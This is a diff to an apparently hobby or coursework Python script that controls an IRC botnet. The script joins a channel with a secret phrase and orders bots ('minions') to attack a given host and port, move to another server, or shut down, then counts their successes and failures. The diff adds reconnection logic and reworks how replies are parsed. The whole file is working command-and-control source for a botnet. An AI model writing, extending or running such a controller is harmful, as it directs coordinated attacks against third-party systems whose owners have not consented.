@@ -4,6 +4,26 @@ import select
 import signal
 
 
+def joinIRC(irc):
+    # initialisation stugg
+    nickname = "BetterThanYou"
+    irc.send(bytes("USER TheController 8 * : I'm The Best\r\n", "utf-8"))
+    irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
+    ready = select.select([irc], [], [], 1) # wait 1 second
+    if ready[0]:
+        response = (irc.recv(1024)).decode("utf-8")
+        print(response)
+        while "Nickname is already in use" in response:
+            nickname = "Way" + nickname
+            irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
+            ready = select.select([irc], [], [], 1) # wait 1 second
+            if ready[0]:
+                response = (irc.recv(1024)).decode("utf-8")
+            else: continue
+    irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
+    irc.send(bytes("PRIVMSG #" + channel + " :" + secretphase + "\r\n", "utf-8"))
+    return nickname
+
 try:
     hostname = sys.argv[1]
     port = int(sys.argv[2])
@@ -15,26 +35,19 @@ except:
 
 # connect to irc
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-irc.connect((hostname, port))
+# wait 5 seconds until connected
+irc.settimeout(5)
+while 1:
+    try:
+        irc.connect((hostname, port))
+        irc.settimeout(None)    # if reaches here, it connected, yay
+        break
+    except:
+        sys.exit(-1)    # if reaches here, wasn't able to connect, noo
 irc.setblocking(0)
 
 # some initialising stuff
-nickname = "BetterThanYou"
-irc.send(bytes("USER TheController 8 * : I'm The Best\r\n", "utf-8"))
-irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
-ready = select.select([irc], [], [], 1) # wait 1 second
-if ready[0]:
-    response = (irc.recv(1024)).decode("utf-8")
-    print(response)
-    while "Nickname is already in use" in response:
-        nickname = "Way" + nickname
-        irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
-        ready = select.select([irc], [], [], 1) # wait 1 second
-        if ready[0]:
-            response = (irc.recv(1024)).decode("utf-8")
-        else: continue
-irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
-irc.send(bytes("PRIVMSG #" + channel + " :" + secretphase + "\r\n", "utf-8"))
+nickname = joinIRC(irc)
 
 minions = []
 response = ""
@@ -44,19 +57,35 @@ atk_count = 0
 fail_count = 0
 
 while 1:
-    ready = select.select([irc], [], [], 2) # wait 2 seconds
+    command = ""
+    ready = select.select([irc,], [], [], 2) # wait 2 seconds
     if ready[0]:
         response = (irc.recv(1024)).decode("utf-8")
         print(response)
+        if response == "":  # if connection is closed
+            # try to reconnect
+            irc.close()
+            irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            irc.settimeout(5)
+            print("attempting to reconnect")
+            while 1:
+                try:
+                    irc.connect((hostname, port))
+                    irc.settimeout(None)    # if reached here, it reconnected, yay
+                    print("reconnection success")
+                    joinIRC(irc)
+                    break
+                except socket.timeout:
+                    print("timeout, time to go home")
+                    sys.exit(-1) # timeout, just give up and quit
+                except Exception as e:
+                    continue
+    else:
+        command = input("State thy command> ")
 
     if response.split(" ", 1)[0] == "PING":
         argument = response.split(" ", 2)[1]
         irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))
-
-
-    command = input("State thy command> ")
-
-
 
     # Status
     if command == "status":
@@ -64,18 +93,14 @@ while 1:
         print("Calling all of my minions to answer back to me")
         minions = []
         while 1:
-            ready = select.select([irc], [], [], 2) # wait 2 seconds
+            ready = select.select([irc], [], [], 3) # wait 2 seconds
             if ready[0]:
                 response = (irc.recv(1024)).decode("utf-8")
-                try:
-                    size = len(response.split())
-                    follower = response.split(" ", size)[size-1]
-                    follower = follower.split(":", 2)[1]
-                except:
-                    print("uhhh hold on")
-                    continue
-                if follower.strip("\r\n") not in minions:
-                    minions.append(follower.strip("\r\n"))
+                for i, m in enumerate(response.split()):
+                    if nickname in m:
+                        follower = response.split()[i+1].strip(":")
+                        if follower.strip("\r\n") not in minions:
+                            minions.append(follower.strip("\r\n"))
             else: break
         if len(minions) < 1:
             print("Where are my minions? I have none...")
@@ -96,26 +121,28 @@ while 1:
             port = command.split(" ", 3)[2]
             irc.send(bytes("PRIVMSG #" + channel + " :Attack " + hostname + " " + port + "\r\n", "utf-8"))
             # wait for bots to tell status of attack
+            fail_count = 0
+            atk_count = 0
             while 1:
-                ready = select.select([irc], [], [], 5) # wait 5 seconds
+                ready = select.select([irc], [], [], 3) # wait 3 seconds
                 if ready[0]:
                     response = (irc.recv(1024)).decode("utf-8")
-                    if "attack successful," in response:
-                        attacker = response.split("!", 1)[0]
-                        attacker = attacker.split(":", 2)[1]
-                        size = len(response.split("= "))
-                        atk_count = atk_count + int(response.split("= ", size)[size-1])
-                        print(attacker + ": attack successful")
-                    elif "attack unsuccessful," in response:
-                        attacker = response.split("!", 1)[0]
-                        attacker = attacker.split(":", 2)[1]
-                        size = len(response.split("= "))
-                        fail_count = fail_count + int(response.split("= ", size)[size-1])
-                        print(attacker + ": attack unsuccessful")
+                    for i, m in enumerate(response.split()):
+                        if m == ":attack": # they are speaking about attacking
+                            minion = response.split()[i-3]
+                            minion = minion.strip(":")
+                            minion = minion.split("!", 1)[0]
+                            # check if success or failiure
+                            if response.split()[i+1] == "unsuccessful":
+                                print(minion + ": Attack failed!")
+                                fail_count = fail_count + 1
+                            else:   # success!
+                                print(minion + ": Attack successful!")
+                                atk_count = atk_count + 1
                 else: break
             print("successful attack count: " + str(atk_count) + ", unsuccessful attack count: " + str(fail_count))
-        except:
-            print("O M Goodnesses, do it right next time!")
+        except Exception as e:
+            print("O M Goodnesses, do it right next time! Error:", e)
 
     # Move
     if command.split(" ", 1)[0] == "move":
@@ -124,25 +151,30 @@ while 1:
             port = command.split(" ", 3)[2]
             move_channel = command.split(" ", 4)[3]
             irc.send(bytes("PRIVMSG #" + channel + " :Move " + hostname + " " + port + " " + move_channel + "\r\n", "utf-8"))
-            # wait for bots to tell status of move; wait 3 seconds?
+            # wait for bots to tell status of move
+            left = 0
+            notleft = 0
             while 1:
                 ready = select.select([irc], [], [], 3) # wait 3 seconds
                 if ready[0]:
                     response = (irc.recv(1024)).decode("utf-8")
-                    print(response)
-                    try:
-                        follower = response.split("!", 1)[0]
-                        follower = follower.split(":", 2)[1]
-                        if "unsuccessful" in response:
-                            print("Move did not work for: " + follower)
-                        else:
-                            print(follower + " has left forever!")
-                    except exc:
-                        print("bad")
-                        continue
+                    for i, m in enumerate(response.split()):
+                        if m == ":move": # they are speaking about moving
+                            minion = response.split()[i-3]
+                            minion = minion.strip(":")
+                            minion = minion.split("!", 1)[0]
+                            # check if success or failiure
+                            if response.split()[i+1] == "unsuccessful":
+                                print(minion + ": Move failed!")
+                                notleft = notleft + 1
+                            else:   # success!
+                                print(minion + ": Move successful!")
+                                left = left + 1
                 else: break
-        except:
-            print("O M Goodnesses, do it right next time!")
+            print(left, "of my minions moved successfully")
+            print(notleft, "of my minions failed moving")
+        except Exception as e:
+            print("O M Goodnesses, do it right next time! Error: ", e)
 
     # Quit
     if command == "quit":
@@ -152,3 +184,16 @@ while 1:
     # Shutdown
     if command == "shutdown":
         irc.send(bytes("PRIVMSG #" + channel + " :Go home, guys\r\n", "utf-8"))
+        gone = 0
+        while 1:
+            ready = select.select([irc], [], [], 3) # wait 3 seconds
+            if ready[0]:
+                response = (irc.recv(1024)).decode("utf-8")
+                for i, m in enumerate(response.split()):
+                    if m == "QUIT": # they are speaking about moving
+                        minion = response.split()[i+1]
+                        minion = minion.strip(":")
+                        minion = minion.strip("\r\n")
+                        gone = gone + 1
+            else: break
+        print(gone, "of minions have left")
